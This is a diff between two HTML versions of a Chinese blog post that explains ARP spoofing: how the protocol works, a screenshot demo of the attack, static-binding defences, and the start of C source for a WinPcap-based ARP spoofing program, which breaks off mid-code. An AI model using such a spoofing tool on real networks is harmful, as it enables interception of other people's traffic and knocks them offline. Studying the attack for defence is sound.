@@ -1,36 +1,32 @@
-
- <!DOCTYPE HTML>
-<html lang="zh-Hans">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="UTF-8">
-  
-    <title>ARP协议分析与漏洞利用 | Anka9080&#39;s Notes</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
-    
-    <meta name="author" content="Anka9080">
     
 
     
-    <meta name="description" content="好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD
 
-ARP 协议是什么局域网通信中需要知道目标主机的MAC地址才能与其建立连接。
-ARP是地址解析协议，根据目标主机的IP地址获取其MAC地址。
-ARP 工作流程
-如图所示局域网双方通信时：
-首先检测ARP缓存表，缓存表没有目标IP-MAC映射时需要先向全网发送目的IP为192.168.1.xxx 
-目的MAC为FF-FF-FF-F">
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    <title>ARP协议分析与漏洞利用 | Anka9080&#39;s Notes | 勿忘初心。</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="ARP欺骗">
+    <meta name="description" content="好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD  ARP 协议是什么局域网通信中需要知道目标主机的MAC地址才能与其建立连接。 ARP是地址解析协议，根据目标主机的IP地址获取其MAC地址。 ARP 工作流程">
+<meta name="keywords" content="ARP欺骗">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ARP协议分析与漏洞利用">
 <meta property="og:url" content="http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/index.html">
-<meta property="og:site_name" content="Anka9080's Notes">
-<meta property="og:description" content="好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD
-
-ARP 协议是什么局域网通信中需要知道目标主机的MAC地址才能与其建立连接。
-ARP是地址解析协议，根据目标主机的IP地址获取其MAC地址。
-ARP 工作流程
-如图所示局域网双方通信时：
-首先检测ARP缓存表，缓存表没有目标IP-MAC映射时需要先向全网发送目的IP为192.168.1.xxx 
-目的MAC为FF-FF-FF-F">
+<meta property="og:site_name" content="Anka9080&#39;s Notes">
+<meta property="og:description" content="好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD  ARP 协议是什么局域网通信中需要知道目标主机的MAC地址才能与其建立连接。 ARP是地址解析协议，根据目标主机的IP地址获取其MAC地址。 ARP 工作流程">
 <meta property="og:image" content="http://7xku36.com1.z0.glb.clouddn.com/arpimage1.png">
 <meta property="og:image" content="http://7xku36.com1.z0.glb.clouddn.com/arpimage2.png">
 <meta property="og:image" content="http://7xku36.com1.z0.glb.clouddn.com/arpimage3.png">
@@ -45,96 +41,180 @@ ARP 工作流程
 <meta property="og:updated_time" content="2016-10-27T16:58:01.850Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ARP协议分析与漏洞利用">
-<meta name="twitter:description" content="好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD
-
-ARP 协议是什么局域网通信中需要知道目标主机的MAC地址才能与其建立连接。
-ARP是地址解析协议，根据目标主机的IP地址获取其MAC地址。
-ARP 工作流程
-如图所示局域网双方通信时：
-首先检测ARP缓存表，缓存表没有目标IP-MAC映射时需要先向全网发送目的IP为192.168.1.xxx 
-目的MAC为FF-FF-FF-F">
+<meta name="twitter:description" content="好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD  ARP 协议是什么局域网通信中需要知道目标主机的MAC地址才能与其建立连接。 ARP是地址解析协议，根据目标主机的IP地址获取其MAC地址。 ARP 工作流程">
 <meta name="twitter:image" content="http://7xku36.com1.z0.glb.clouddn.com/arpimage1.png">
-
     
-    <link rel="alternative" href="/atom.xml" title="Anka9080&#39;s Notes" type="application/atom+xml">
+        <link rel="alternate" type="application/atom+xml" title="Anka9080&#39;s Notes" href="/atom.xml">
     
-    
-    <link rel="icon" href="/img/favicon.ico">
-    
-    
-    <link rel="apple-touch-icon" href="/img/jacman.jpg">
-    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
-    
-    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
 </head>
 
-  <body>
-    <header>
-      
-<div>
-		
-			<div id="textlogo">
-				<h1 class="site-name"><a href="/" title="Anka9080&#39;s Notes">Anka9080&#39;s Notes</a></h1>
-				<h2 class="blog-motto">勿忘初心。</h2>
-			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
-			</a></div>
-			<nav class="animated">
-				<ul>
-					<ul>
-					 
-						<li><a href="/">Home</a></li>
-					
-						<li><a href="/archives">Archives</a></li>
-					
-						<li><a href="/2048/">About</a></li>
-					
-					<li>
- 					
-					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
-						<label>Search</label>
-						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
-						<input type="hidden" name="q" value="site:www.evilclay.com">
-					</form>
-					
-					</li>
-				</ul>
-			</nav>			
-</div>
-    </header>
-    <div id="container">
-      <div id="main" class="post" itemscope itemprop="blogPost">
-  
-	<article itemprop="articleBody"> 
-		<header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/10/28/ARP协议分析与漏洞利用/" title="ARP协议分析与漏洞利用" itemprop="url">ARP协议分析与漏洞利用</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-10-27T16:28:12.000Z" itemprop="datePublished"> Published 2016-10-28</time>
-    
-  </p>
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Anka9080</h5>
+          <a href="mailto:634206017@qq.com" title="634206017@qq.com" class="mail">634206017@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yscoder" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://www.weibo.com/ysweb" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/custom"  >
+                <i class="icon icon-lg icon-link"></i>
+                测试
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">ARP协议分析与漏洞利用</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
 </header>
-	<div class="article-content">
-		
-		<div id="toc" class="toc-article">
-			<strong class="toc-title">Contents</strong>
-		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP-协议是什么"><span class="toc-number">1.</span> <span class="toc-text">ARP 协议是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP-工作流程"><span class="toc-number">2.</span> <span class="toc-text">ARP 工作流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP协议的漏洞"><span class="toc-number">3.</span> <span class="toc-text">ARP协议的漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用思路"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击Demo"><span class="toc-number">5.</span> <span class="toc-text">攻击Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防护措施"><span class="toc-number">6.</span> <span class="toc-text">防护措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击程序代码-C语言"><span class="toc-number">7.</span> <span class="toc-text">攻击程序代码(C语言)</span></a></li></ol>
-		
-		</div>
-		
-		<blockquote>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">ARP协议分析与漏洞利用</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2016-10-27T16:28:12.000Z" itemprop="datePublished" class="page-time">
+  2016-10-28
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ARP-协议是什么"><span class="post-toc-number">1.</span> <span class="post-toc-text">ARP 协议是什么</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ARP-工作流程"><span class="post-toc-number">2.</span> <span class="post-toc-text">ARP 工作流程</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ARP协议的漏洞"><span class="post-toc-number">3.</span> <span class="post-toc-text">ARP协议的漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用思路"><span class="post-toc-number">4.</span> <span class="post-toc-text">漏洞利用思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#攻击Demo"><span class="post-toc-number">5.</span> <span class="post-toc-text">攻击Demo</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#防护措施"><span class="post-toc-number">6.</span> <span class="post-toc-text">防护措施</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#攻击程序代码-C语言"><span class="post-toc-number">7.</span> <span class="post-toc-text">攻击程序代码(C语言)</span></a></li></ol>
+        </nav>
+    </aside>
+    
+<article id="post-ARP协议分析与漏洞利用"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">ARP协议分析与漏洞利用</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2016-10-28 00:28:12" datetime="2016-10-27T16:28:12.000Z"  itemprop="datePublished">2016-10-28</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+            
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <blockquote>
 <p>好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD</p>
 </blockquote>
 <h2 id="ARP-协议是什么"><a href="#ARP-协议是什么" class="headerlink" title="ARP 协议是什么"></a>ARP 协议是什么</h2><p>局域网通信中需要知道目标主机的MAC地址才能与其建立连接。</p>
 <p>ARP是地址解析协议，根据目标主机的IP地址获取其MAC地址。</p>
-<h2 id="ARP-工作流程"><a href="#ARP-工作流程" class="headerlink" title="ARP 工作流程"></a>ARP 工作流程</h2><p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage1.png" alt="ARP工作流程"></p>
+<h2 id="ARP-工作流程"><a href="#ARP-工作流程" class="headerlink" title="ARP 工作流程"></a>ARP 工作流程</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage1.png" alt="ARP工作流程" title="">
+                </div>
+                <div class="image-caption">ARP工作流程</div>
+            </figure>
 <p>如图所示局域网双方通信时：</p>
 <p>首先检测ARP缓存表，缓存表没有目标IP-MAC映射时需要先向全网发送目的IP为192.168.1.xxx </p>
 <p>目的MAC为FF-FF-FF-FF-FF-FF的全网广播，当局域网中IP为192.168.1.xxx的主机收到请求时，</p>
@@ -146,7 +226,13 @@ ARP 工作流程
 </blockquote>
 <p>可以看出ARP缓存表是双方通信的基础，这个ARP缓存表是否是可以“手动”修改的？  当然可以。 </p>
 <p>在系统CMD下，有ARP配置命令：</p>
-<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage2.png" alt="ARP命令"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage2.png" alt="ARP命令" title="">
+                </div>
+                <div class="image-caption">ARP命令</div>
+            </figure>
 <p>可以直接管理的当前系统的ARP缓存表。</p>
 <h2 id="ARP协议的漏洞"><a href="#ARP协议的漏洞" class="headerlink" title="ARP协议的漏洞"></a>ARP协议的漏洞</h2><p>主机在更新ARP缓存表时并不检测收到的ARP响应包的正确性，直接根据响应包的信息对缓存表进行更新。</p>
 <p>无论之前是否发过ARP请求，再收到ARP响应包后都会对ARP缓存表进行更新。</p>
@@ -154,24 +240,72 @@ ARP 工作流程
 <p>II．目标主机更新本地ARP缓存表</p>
 <p>III．目标主机的通信收到影响（断网，MIT攻击）。</p>
 <h2 id="攻击Demo"><a href="#攻击Demo" class="headerlink" title="攻击Demo"></a>攻击Demo</h2><p>1、 攻击前目标主机能够正常上网</p>
-<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage3.png" alt=""></p>
-<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage4.png" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
 <p>2、 运行攻击程序 对 目标主机进行ARP 欺骗攻击<br>主要是构造四个参数：源IP，MAC，目标IP，MAC</p>
-<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage5.png" alt="run_arp_attack"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage5.png" alt="run_arp_attack" title="">
+                </div>
+                <div class="image-caption">run_arp_attack</div>
+            </figure>
 <ol>
 <li>Wireshark 抓数据包</li>
 </ol>
-<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage6.png" alt="wire"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage6.png" alt="wire" title="">
+                </div>
+                <div class="image-caption">wire</div>
+            </figure>
 <p>数据包的详细内容</p>
-<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage7.png" alt="packet"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage7.png" alt="packet" title="">
+                </div>
+                <div class="image-caption">packet</div>
+            </figure>
 <ol>
 <li>攻击效果</li>
 </ol>
-<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage8.png" alt="attack_res"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage8.png" alt="attack_res" title="">
+                </div>
+                <div class="image-caption">attack_res</div>
+            </figure>
 <p>请求网关测试</p>
-<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage9.png" alt="req_gateway"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage9.png" alt="req_gateway" title="">
+                </div>
+                <div class="image-caption">req_gateway</div>
+            </figure>
 <p>请求百度网站测试</p>
-<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage10.png" alt="req_baidu"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage10.png" alt="req_baidu" title="">
+                </div>
+                <div class="image-caption">req_baidu</div>
+            </figure>
 <h2 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h2><p>静态添加ARP缓存表条目，避免ARP条目的恶意被动更新。</p>
 <pre><code>CMD下：arp -s 目标IP 目标MAC
 </code></pre><p>Win8/10下，该命令权限不够，用之下方法绑定</p>
@@ -179,435 +313,306 @@ ARP 工作流程
 netsh -c i i add neighbors 4 192.168.1.1 0c-72-2c-25-ca-66
 // 4为 第一条命令回显的本地连接网卡Idx号
 </code></pre><p>结果如图：</p>
-<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage11.png" alt="def_res"></p>
-<h2 id="攻击程序代码-C语言"><a href="#攻击程序代码-C语言" class="headerlink" title="攻击程序代码(C语言)"></a>攻击程序代码(C语言)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// ARP攻击程序源代码</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;packet32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddndis.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MY_ARP_CHEAT_INCLUDE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_ARP_CHEAT_INCLUDE_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字节对齐必须是1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack (1)</span></span><br><span class="line"><span class="keyword">struct</span> ethernet_head</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> dest_mac[<span class="number">6</span>]; <span class="comment">//目标主机MAC地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> source_mac[<span class="number">6</span>]; <span class="comment">//源端MAC地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> eh_type; <span class="comment">//以太网类型</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> arp_head</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> hardware_type; <span class="comment">//硬件类型：以太网接口类型为1</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> protocol_type; <span class="comment">//协议类型：IP协议类型为0X0800</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> add_len; <span class="comment">//硬件地址长度：MAC地址长度为6B</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> pro_len; <span class="comment">//协议地址长度：IP地址长度为4B</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> option; <span class="comment">//操作：ARP请求为1，ARP应答为2</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> sour_addr[<span class="number">6</span>]; <span class="comment">//源MAC地址：发送方的MAC地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> sour_ip; <span class="comment">//源IP地址：发送方的IP地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> dest_addr[<span class="number">6</span>]; </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip; </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> padding[<span class="number">18</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> arp_packet <span class="comment">//最终arp包结构</span></span><br><span class="line">&#123;</span><br><span class="line">	ethernet_head eth; <span class="comment">//以太网头部</span></span><br><span class="line">	arp_head arp; <span class="comment">//arp数据包头部</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack ()</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="title">BuildArpPacket</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* source_mac, <span class="keyword">unsigned</span> <span class="keyword">char</span>* dest_mac,</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> src_ip, <span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> errbuf[PCAP_ERRBUF_SIZE];   <span class="comment">//错误缓冲区</span></span><br><span class="line">	<span class="keyword">int</span> times;	<span class="comment">//	发送次数</span></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *packet;	<span class="comment">//ARP包</span></span><br><span class="line">	<span class="keyword">pcap_t</span> *adhandle;	<span class="comment">//一个pcap实例</span></span><br><span class="line">	<span class="keyword">pcap_if_t</span> *alldevs;	<span class="comment">//	全部网卡列表</span></span><br><span class="line">	<span class="keyword">pcap_if_t</span> *device;	<span class="comment">//	一个网卡</span></span><br><span class="line">	<span class="keyword">int</span> inum;	<span class="comment">//	用户选择的网卡序号</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//	获得本机网卡列表</span></span><br><span class="line">	<span class="keyword">if</span> (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &amp;alldevs, errbuf) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error in pcap_findalldevs: %s\n"</span>, errbuf);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	打印网卡列表</span></span><br><span class="line">	<span class="keyword">for</span> (device = alldevs; device; device = device-&gt;next)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d"</span>, ++i);</span><br><span class="line">		<span class="keyword">if</span> (device-&gt;description)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">". %s\n"</span>, device-&gt;description);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">". No description available\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	如果没有发现网卡</span></span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\nNo interfaces found! Make sure WinPcap is installed.\n"</span>);</span><br><span class="line">		return <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//	请用户选择一个网卡</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Enter the interface number (1-%d):"</span>, i);</span><br><span class="line">	scanf_s(<span class="string">"%d"</span>, &amp;inum);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	移动指针到用户选择的网卡</span></span><br><span class="line">	<span class="keyword">for</span> (device = alldevs, i = <span class="number">0</span>; i&lt; inum - <span class="number">1</span>; device = device-&gt;next, i++);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> chs_src_ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> chs_dest_ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ul_src_ip = <span class="number">0u</span>;</span><br><span class="line">	